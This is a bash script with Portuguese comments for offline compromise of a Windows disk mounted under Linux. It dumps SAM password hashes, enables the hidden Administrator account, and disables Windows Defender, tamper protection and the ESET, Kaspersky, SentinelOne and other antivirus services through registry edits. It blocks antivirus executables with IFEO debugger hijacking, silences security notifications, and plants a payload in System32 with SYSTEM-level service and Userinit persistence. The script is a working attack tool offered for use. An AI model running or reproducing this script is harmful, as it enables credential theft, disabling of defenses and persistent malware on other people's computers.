#!/bin/bash

# --- CONFIGURAÇÕES ---
PAYLOAD="Windows.exe"
PAYLOAD_PATH="C:\\Windows\\System32\\$PAYLOAD"
DEST_DIR="$HOME/Desktop/Post_Exploitation"

# Lista exaustiva de Endpoints e AVs (ekrn=ESET, avp=Kaspersky)
AV_SERVICES=("ekrn" "epfw" "avp" "avpckcl" "SmadavService" "Smadav" "SentinelAgent" "SepMasterService" "McAfeeFramework" "WinDefend" "mpssvc")

echo "[+] OPERAÇÃO OMNI: PERSISTÊNCIA SYSTEM & KILL TOTAL (AV/ENDPOINT)"

# 1. MONTAGEM E REPARAÇÃO
MOUNT_POINT=$(mount | grep -i "ntfs" | awk '{print $3}' | head -n 1)
if [ -z "$MOUNT_POINT" ]; then echo "[-] Erro: Disco Windows não encontrado."; exit 1; fi

PARTICAO=$(mount | grep "$MOUNT_POINT" | awk '{print $1}')
sudo ntfsfix "$PARTICAO" &>/dev/null

SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"

mkdir -p "$DEST_DIR"

# 2. CAPTURA DE HASHES OFFLINE
echo "[*] Extraindo hashes locais (SAM)..."
sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"

# 3. ADMIN OCULTO & SEGURANÇA NATIVA
echo "[*] Ativando Admin Oculto e matando Defender/SmartScreen..."
# Ativar Admin (Valor 11 ativa, 10 desativa)
printf "cd Domains\\\\Account\\\\Users\\\\000001F4\ned F\n11\nq\ny\n" | sudo chntpw -i "$SAM" &>/dev/null

# Desativar Defender e Tamper
printf "cd Microsoft\\\\Windows Defender\nnv 4 DisableAntiSpyware\ned DisableAntiSpyware\n1\ncd Real-Time Protection\nnv 4 DisableRealtimeMonitoring\ned DisableRealtimeMonitoring\n1\ncd ..\\\\Features\nnv 4 TamperProtection\ned TamperProtection\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 4. NUKE: KASPERSKY, ESET ENDPOINT E OUTROS
echo "[*] Desativando serviços de Endpoints e Kaspersky..."
for svc in "${AV_SERVICES[@]}"; do
    printf "cd ControlSet001\\\\Services\\\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
done

# Bloqueio IFEO (Impede que os .exe do Smadav e Kaspersky iniciem)
echo "[*] Aplicando bloqueio de execução IFEO..."
for exe in "Smadav.exe" "avp.exe" "ekrn.exe" "epfw"; do
    printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\nnewkey $exe\ncd $exe\nnv 1 Debugger\ned Debugger\nsvchost.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
done

# 5. SILENCIAR NOTIFICAÇÕES (Modo Invisível)
echo "[*] Desativando notificações e Central de Segurança..."
printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\ImmersiveShell\nnv 4 UseActionCenterExperience\ned UseActionCenterExperience\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 6. PERSISTÊNCIA SYSTEM (O Coração do Bot)
echo "[+] Criando serviço nativo de nível SYSTEM..."
printf "cd ControlSet001\\\\Services\nnewkey WinInternalSvc\ncd WinInternalSvc\nnv 4 Start\ned Start\n2\nnv 4 Type\ned Type\n16\nnv 1 ImagePath\ned ImagePath\n$PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# Userinit como redundância
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd /c start $PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 7. DEPLOY FINAL NA SYSTEM32
if [ -f "./$PAYLOAD" ]; then
    sudo cp "./$PAYLOAD" "$MOUNT_POINT/Windows/System32/"
    sync
    echo "[!!!] OPERAÇÃO CONCLUÍDA. Payload como SYSTEM e defesas neutralizadas."
else
    echo "[-] Erro: $PAYLOAD não encontrado."
fi
